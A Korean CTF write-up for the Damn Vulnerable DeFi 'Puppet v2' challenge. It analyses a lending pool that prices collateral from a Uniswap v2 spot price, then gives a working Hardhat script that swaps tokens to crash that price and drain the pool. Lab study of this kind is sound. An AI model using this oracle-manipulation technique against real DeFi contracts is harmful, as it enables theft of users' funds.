https://teberr.notion.site/Damn-Vulnerable-Defi-Puppet-v2-fa9d18ee1b4940769da54dc4cd272472

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4d58d28c-14f0-4c63-a66b-aa65c4814803/%EB%AC%B8%EC%A0%9C.png)

문제 #9 - Puppet v2

PuppetPool의 개발자들이 실수한 것을 고쳐서 새로운 버전의 대출 풀을 출시했습니다. 가격 오라클로 유니스왑 v2 exchange를 사용하고 있고 유틸리티 라이브러리를 사용하는 것을 권장하고 있습니다.

20이더와 10000DVT 토큰을 가지고 새로운 대출풀의 1백만 DVT 토큰을 전부 가져오면 성공입니다.

# 코드 분석 및 공격 설계

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/libraries/SafeMath.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

/**
 * @title PuppetV2Pool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetV2Pool {
    using SafeMath for uint256;

    address private _uniswapPair;
    address private _uniswapFactory;
    IERC20 private _token;
    IERC20 private _weth;
    
    mapping(address => uint256) public deposits;
        
    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);

    constructor (
        address wethAddress,
        address tokenAddress,
        address uniswapPairAddress,
        address uniswapFactoryAddress
    ) public {
        _weth = IERC20(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapPair = uniswapPairAddress;
        _uniswapFactory = uniswapFactoryAddress;
    }

    /**
     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH
     *         Sender must have approved enough WETH in advance.
     *         Calculations assume that WETH and borrowed token have same amount of decimals.
     */
    function borrow(uint256 borrowAmount) external {
        require(_token.balanceOf(address(this)) >= borrowAmount, "Not enough token balance");

        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);
        
        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        require(_token.transfer(msg.sender, borrowAmount));

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);
    }

    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
            _uniswapFactory, address(_weth), address(_token)
        );
        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
    }
}
```

새로운 PuppetV2pool 컨트랙트는 기존의 Puppet과 다른 점이 두가지 있다.

1. Uniswap v2를 사용하여 오라클에서 가격을 가져올 때 공식 라이브러리를 사용한다.
2. 토큰을 대출받기 위해 필요로 하는 토큰은 weth(wrapped eth)이며 weth의 금액이 대출 받고자 하는 금액의 세배로 바뀌었다. (기존은 두배) 

이를 해결하기 위해서 달라진 UniswapV2Library의 getReserves와 quote 함수를 살펴보자.

![내부적으로 getReserves를 호출하는 함수.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d500e462-2b2c-4023-ac24-2b48b86cab07/%EB%82%B4%EB%B6%80%EC%A0%81%EC%9C%BC%EB%A1%9C_getReserves%EB%A5%BC_%ED%98%B8%EC%B6%9C%ED%95%98%EB%8A%94_%ED%95%A8%EC%88%98.png)

문제에서 사용하고 있는 getReserves 함수는 전달된 tokenA와 tokenB를 이용해 내부적으로 getReserves를 다시 호출하여 그 결과값을 리턴해주는 함수이다. 그 내부 함수는

![getReserves함수.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d5a14355-525f-40d3-94f1-8e07703162bf/getReserves%ED%95%A8%EC%88%98.png)

토큰A와 토큰B의 거래를 위한 거래 가격을 책정하고 유동성을 분배하는데 사용되는 tokenA와 tokenB의 reserve를 반환해준다.

즉 거래 가격을 책정하기 전에 미리 준비하는 단계라고 보면 된다. 이를 바탕으로 quote 함수를 이용해 가격을 측정한다.

![quote.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/432bb7dc-5bc1-4c98-bc69-92714e3ec558/quote.png)

reserveA 를 amountA 만큼 얻기 위해서 필요한 reserveB의 양 amountB를 반환해 준다.

즉   `return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);`
의 의미는 사용자가 DVT 토큰을 대출받고자 하는 양에 상응하는 WETH의 양을 리턴해준다.

이 값을 `calculateDepositOfWETHRequired` 함수에서       

`return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);` 으로 3배를 해주므로 결국 빌리고자 하는 DVT 토큰양에 따라 입금해야 하는 WETH의 양은 세배가 된다.

유니스왑 V2에서는 어떤식으로 가격을 측정하는지 알아보자.

![uniswapv2.jpg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d807750c-33dc-4e81-96cb-6c9b361c2dbe/uniswapv2.jpg)

유니스왑 v1하고 크게 다르지 않게. ****`x * y = k`** 공식을 이용한다. 

토큰 A와 토큰B가 각각 1200개 400개 있다고 했을 때 토큰 A 3개를 토큰 B로 스왑한다고 하면 풀에 넣은 후의 토큰A와 토큰B의 값이 곱해진 결과가 최대한 k가 되도록 유지한다. 그러면 문제에서는 어떻게 되는지 확인하자.

```tsx
// Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');
```

유니스왑 v2에 초기 유동적으로 제공되는 비율은 DVT토큰 : WETH = 100:10 이다. 즉 DVT토큰 * WETH = 1000으로 생각하면 된다. 현재가격은 1WETH가 10DVT토큰으로 생각하면 된다.

9900DVT 토큰을 스왑하여 10000DVT토큰이 되면 WETH의 양 * 10000 = 1000이 되야 하므로 풀에 남아있는 WETH는 0.1WETH여야 한다. 즉 9.9 WETH를 받을 수 있다. 그러면 가격도 0.1 : 10000이므로 3WETH당 10만 DVT 토큰을 빌릴수 있게 된다(대출은 세배이므로) . 그러면 100만 DVT 토큰을 대출받기 위해서는 30WETH를 넣어야 하는데 이는 기존20ETH + 스왑받은 9.9WETH 총 29.9ETH만 있어 살짝 부족할 것으로 추측된다. 이 문제의 목적은 대출풀에 있는 100만 DVT 토큰을 탈취하여 공격자의 주소에 토큰이 100만 DVT”이상” 있으면 클리어기 때문에 초기자금 10000토큰을 전부 넣어주며 진행한다.

# 공격

test 폴더의 puppet-v2.challenge.js 에서 테스트를 통해 공격을 실행하자.

```tsx
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
				/** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});
```

먼저 유니스왑v2에서 DVT 토큰을 weth로 스왑하기 위해서는 둘 다 토큰이므로 유니스왑v2의 라우터에서 swapExactTokensToTokens 함수를 사용한다.

![swapexactTokensToTokens.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1839244b-8682-42b5-aec5-1d8033e75f13/swapexactTokensToTokens.png)

swapExactTokensToTokens(보낼 토큰의양, 최소 받아야하는 양, 각 토큰의 주소, 스왑한 후 받을 주소)로 구성되어있다. 이는 approve가 먼저 선행되어야 하므로 DVT토큰을 먼저 approve해주자.

```tsx
it('Exploit', async function () {
        await this.token.connect(attacker).approve(this.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [this.token.address,this.weth.address],
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   
        );
        
        attacker_weth_balance= await this.weth.connect(attacker).balanceOf(attacker.address);
        attacker_eth_balance= await ethers.provider.getBalance(attacker.address);
        console.log("Attacker weth:",ethers.utils.formatEther(attacker_weth_balance));
        console.log("Attacker eth:",ethers.utils.formatEther(attacker_eth_balance));
});
```

DVT 토큰을 weth로 스왑하여 받아온 결과 attacker의 주소에는 weth와 eth가 같이 있게 된다. 이를 console.log로 출력하면

 

```tsx
[Challenge] Puppet v2
Attacker weth: 9.900695134061569016
Attacker eth: 19.999754288536716396
```

가 된다. 우리는 100만 DVT 토큰을 대출하기 위해 weth를 입금할 것이므로 100만 DVT 토큰을 대출하기 위해 필요한 weth를 PuppetV2Pool 컨트랙트의 calculateDepositOfWETHRequired 함수를 이용해서 구해주자.

```tsx
let weth_need = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
console.log("need weth:",ethers.utils.formatEther(weth_need));
```

그러면 100만 DVT 토큰을 구하기 위해 필요한 weth는 총 

```tsx
need weth: 29.49649483319732198
```

약 29.5 weth면 충분하다고 나온다. 이는 공격자의 eth를 weth로 변환했을 때 총 29.9 weth 정도 얻게 되므로 약 19.9이더를 weth로 변환해 필요한 29.5weth보다 넉넉하게 29.8 weth로 맞춰주자.

```tsx
await this.weth.connect(attacker).deposit({value:ethers.utils.parseEther('19.9')});
console.log("Attacker Weth:",ethers.utils.formatEther(await this.weth.connect(attacker).balanceOf(attacker.address)));
console.log("Attacker ether:",ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
```

WETH9.sol 컨트랙트를 살펴보면 deposit 함수를 통해서 eth를 weth로 변환할 수 있다.

```tsx
// WETH9.sol
function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
```

따라서 19.9 eth를 weth로 변환해 주고 난 후 공격자의 Weth와 eth 자산을 보면

```tsx
Attacker Weth: 29.800695134061569016
Attacker ether: 0.09972006625611711
```

로 100만 DVT 토큰을 빌리기위한 29.5weth보다 많은 것을 알 수 있다. 따라서 이제 100만 DVT 토큰을 빌리자.

```tsx
await this.weth.connect(attacker).approve(this.lendingPool.address,weth_need);
this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
```

그러면 100만 DVT 토큰을 대출받게 된다.

최종 코드는 아래와 같다.

```tsx
it('Exploit', async function () {
        await this.token.connect(attacker).approve(this.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);

        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [this.token.address,this.weth.address],
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   
        );
        
        attacker_weth_balance= await this.weth.connect(attacker).balanceOf(attacker.address);
        attacker_eth_balance= await ethers.provider.getBalance(attacker.address);
        console.log("Attacker weth:",ethers.utils.formatEther(attacker_weth_balance));
        console.log("Attacker eth:",ethers.utils.formatEther(attacker_eth_balance));
        
        let weth_need = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("need weth:",ethers.utils.formatEther(weth_need));
        console.log("-------------- eth -> weth -----------------")

        await this.weth.connect(attacker).deposit({value:ethers.utils.parseEther('19.9')});
        console.log("Attacker Weth:",ethers.utils.formatEther(await this.weth.connect(attacker).balanceOf(attacker.address)));
        console.log("Attacker ether:",ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));

        await this.weth.connect(attacker).approve(this.lendingPool.address,weth_need);
        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);

    });
```

1. 유니스왑 라우터에 DVT 토큰을 approve해준다.
2. DVT 토큰을 weth로 스왑해온다.
3. 100만 DVT 토큰을 빌리기 위해 필요한 weth양을 계산한다.
4. 이를 위해 필요한 만큼 보유한 eth를 weth로 변환한다.
5. 대출 풀에 weth를 approve해준다.
6. 1000만 DVT 토큰을 빌린다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/82cc397e-e6e3-42a2-98d1-d48374891708/%EC%84%B1%EA%B3%B5.png)

npm run puppet-v2를 통해 Exploit이 성공적으로 진행되어 문제의 목표를 달성한 것을 확인할 수 있다.
